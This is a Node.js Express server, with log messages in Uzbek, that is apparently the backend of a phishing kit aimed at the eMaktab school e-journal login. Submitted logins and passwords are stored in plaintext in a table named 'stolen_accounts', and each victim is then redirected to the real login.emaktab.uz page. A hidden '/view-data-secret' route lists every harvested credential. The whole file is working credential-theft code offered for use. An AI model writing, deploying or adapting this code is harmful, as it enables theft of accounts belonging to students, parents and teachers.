require("dotenv").config();
const express = require("express");
const { Pool } = require("pg");
const path = require("path");
const app = express();

const pool = new Pool({
  connectionString: process.env.DATABASE_URL,
  ssl: {
    rejectUnauthorized: false,
  },
});

const initDB = async () => {
  try {
    await pool.query(`
      CREATE TABLE IF NOT EXISTS stolen_accounts (
        id SERIAL PRIMARY KEY,
        login TEXT NOT NULL,
        password TEXT NOT NULL,
        created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
      );
    `);
    console.log("Ma'lumotlar bazasi va jadval tayyor!");
  } catch (err) {
    console.error("Jadval yaratishda xatolik:", err);
  }
};
initDB();

app.use(express.urlencoded({ extended: true }));
app.use(express.static("public"));

app.post("/auth/login", async (req, res) => {
  const { login, password } = req.body;

  try {
    await pool.query(
      "INSERT INTO stolen_accounts (login, password) VALUES ($1, $2)",
      [login, password],
    );

    console.log(`Baza yangilandi: ${login} saqlandi!`);
    res.redirect("https://login.emaktab.uz");
  } catch (err) {
    console.error("Xatolik yuz berdi:", err);
    res.redirect("https://login.emaktab.uz");
  }
});
app.get("/view-data-secret", async (req, res) => {
  try {
    const result = await pool.query(
      "SELECT * FROM stolen_accounts ORDER BY created_at DESC",
    );

    let html =
      "<h1>Yig'ilgan ma'lumotlar</h1><table border='1'><tr><th>ID</th><th>Login</th><th>Parol</th><th>Vaqt</th></tr>";
    result.rows.forEach((row) => {
      html += `<tr><td>${row.id}</td><td>${row.login}</td><td>${row.password}</td><td>${row.created_at}</td></tr>`;
    });
    html += "</table>";

    res.send(html);
  } catch (err) {
    res.status(500).send("Bazadan ma'lumot olishda xato yuz berdi.");
  }
});

const PORT = process.env.PORT || 3000;
app.listen(PORT, () => {
  console.log(`Server ${PORT}-portda ishga tushdi`);
});
